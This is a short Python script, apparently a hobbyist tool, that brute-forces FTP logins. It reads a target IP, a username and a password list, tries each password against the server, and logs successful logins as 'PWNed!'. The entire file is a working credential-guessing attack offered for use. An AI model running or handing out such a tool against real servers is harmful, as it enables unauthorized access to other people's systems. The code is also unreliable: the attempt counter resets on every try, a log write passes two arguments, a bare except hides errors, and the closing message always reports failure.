#! /usr/bin/python3

import ftplib
import os
import datetime
import time
import cowsay

# constants
CWD = os.getcwd()
FTPLOG = os.path.join(CWD, 'ftp_bruteforce.log')
LOGHEADER = '''

*****************************************************
*** FTP Bruteforcer logfile' -- Successful logins ***
*****************************************************

'''
# vars
server = input("Enter IP-Address of FTP server: ")
print(server)

user = input("Enter username to brute-force: ")
print(user)

passwd_list = input("Please provide path and filename of passwordlist: ")
print(passwd_list)

starttime = time.time()

try:
    with open(passwd_list, 'r') as passwords:
        for password in passwords:
            password = password.strip()
            try:
                tries = 0
                ftp_con  = ftplib.FTP(server, user, password)
                if ftp_con:
                    print(f'''[+] Success! You have connected to FTP server {server} with user {user}\
                    and password {password} (try #{tries})''')

                    CURRENT_TIME = datetime.datetime.now()
                    LOGLINE = f'[+] PWNed! server: {server} with username: {user}\
                    and password {password} (try #{tries} @ {CURRENT_TIME}\n'

                    tries += 1

                    if os.path.exists(FTPLOG):
                        with open(FTPLOG, 'a+' ) as ftp_log:
                            ftp_log.write(LOGLINE)
                    else:
                        with open(FTPLOG, 'w+') as ftp_log:
                            ftp_log.write(LOGHEADER, LOGLINE)
            except:
                print(f'still trying... *** password: {password} *** try #{tries}\r', end='')

except FileNotFoundError:
    print(f'[-] Sorry. Your password list could not be found at {passwd_list}!')
finally:
    cowsay.trex("SOMETHING WENT REALLY WRONG HERE...")
    endtime = time.time()

